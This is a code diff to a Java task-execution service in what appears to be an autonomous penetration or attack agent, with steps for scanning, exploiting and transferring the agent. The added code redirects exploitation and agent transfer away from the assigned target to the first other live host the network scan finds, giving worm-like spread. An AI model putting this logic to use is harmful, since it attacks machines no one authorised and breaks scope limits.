@@ -13,8 +13,12 @@ import com.spulido.agent.domain.task.StepResult;
 import com.spulido.agent.domain.task.TaskDefinition;
 import com.spulido.agent.domain.task.TaskResult;
 import com.spulido.agent.worker.step.StepHandler;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
 public class TaskExecutionService {
+
+    private static final Logger log = LoggerFactory.getLogger(TaskExecutionService.class);
 
     private final CommandExecutor commandExecutor;
     private final TaskStateLogger taskStateLogger;
@@ -95,6 +99,19 @@ public class TaskExecutionService {
                     }
                     context.put(stepAction, stepResult);
 
+                    // After a successful NETWORK_SCAN that discovered live sibling hosts,
+                    // redirect subsequent steps (SERVICE_SCAN, EXPLOITATION_KNOWLEDGE,
+                    // EXECUTE_EXPLOIT, TRANSFER_AGENT) to the first discovered host that is
+                    // not a local interface address — the agent should target the sibling it
+                    // discovered, not its own assigned target.
+                    if (stepAction == StepAction.NETWORK_SCAN && stepResult.isSuccess()) {
+                        String sibling = resolveFirstDiscoveredSibling(stepResult, targetIp);
+                        if (sibling != null) {
+                            log.info("Redirecting subsequent steps to discovered sibling: {}", sibling);
+                            targetIp = sibling;
+                        }
+                    }
+
                     if (stepResult.isSkipped()) {
                         taskStateLogger.logTaskCompleted(task);
                         continue;
@@ -162,5 +179,44 @@ public class TaskExecutionService {
                 taskStateLogger.logTaskSkipped(task);
             }
         }
+    }
+
+    /**
+     * Scans NETWORK_SCAN result logs for the first discovered host ({@code HOST_FOUND:<addr>})
+     * that is not a local interface address and not equal to the original plan targetIp.
+     * Returns null when no suitable sibling was found.
+     */
+    private String resolveFirstDiscoveredSibling(StepResult result, String originalTargetIp) {
+        if (result.getLogs() == null) return null;
+        java.util.Set<String> local = localInterfaceAddresses();
+        if (originalTargetIp != null) {
+            local.add(originalTargetIp.trim());
+        }
+        for (String line : result.getLogs()) {
+            if (!line.startsWith("HOST_FOUND:")) continue;
+            String addr = line.substring("HOST_FOUND:".length()).trim();
+            int paren = addr.indexOf('(');
+            if (paren > 0) {
+                String inner = addr.substring(paren + 1, addr.indexOf(')', paren));
+                if (!inner.isBlank()) addr = inner.trim();
+            }
+            if (!addr.isBlank() && !local.contains(addr)) {
+                return addr;
+            }
+        }
+        return null;
+    }
+
+    private static java.util.Set<String> localInterfaceAddresses() {
+        java.util.Set<String> addrs = new java.util.HashSet<>();
+        try {
+            for (java.net.NetworkInterface nic : java.util.Collections.list(java.net.NetworkInterface.getNetworkInterfaces())) {
+                java.util.Enumeration<java.net.InetAddress> ia = nic.getInetAddresses();
+                while (ia.hasMoreElements()) {
+                    addrs.add(ia.nextElement().getHostAddress());
+                }
+            }
+        } catch (Exception ignored) { }
+        return addrs;
     }
 }
